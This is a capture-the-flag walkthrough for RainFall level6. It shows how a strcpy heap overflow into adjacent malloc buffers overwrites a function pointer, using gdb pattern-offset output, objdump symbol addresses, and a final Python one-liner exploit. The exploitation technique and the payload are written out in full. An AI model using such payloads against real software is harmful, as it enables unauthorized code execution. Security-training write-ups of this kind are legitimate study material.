First, let's analyze the binary. The program performs two malloc operations one after the other, and there are two functions: one that is called via a function pointer and another that is not called.

Let's focus on the malloc operations in our program. There are two, one after the other, and the second one becomes the function pointer of m before being executed.

Since the malloc calls are made directly one after the other, it is predictable that their addresses will follow each other. argv[1] is copied into the first malloc buffer using strcpy.

We will overflow the first malloc buffer to reach the second one and redirect it to n instead of m.

To do this, we will start by determining the size of the first malloc buffer using wiremask to provide a pattern.

```
level6@RainFall:~$ gdb level6
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level6/level6...(no debugging symbols found)...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x41346341 in ?? ()
```

When we put `0x41346341` in `wiremask` it find an offset of 72.


After that, we will look for the pointer to n.


```Shell
objdump -t level6
...
08049824  w      .data  00000000              data_start
08048454 g     F .text  00000014              n
0804982c g       *ABS*  00000000              _edata
...
```

address of `n` : `08048454`
little-endian : `/x54/x84/x04/x08`

Putting this together give us :
```Shell
./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
```
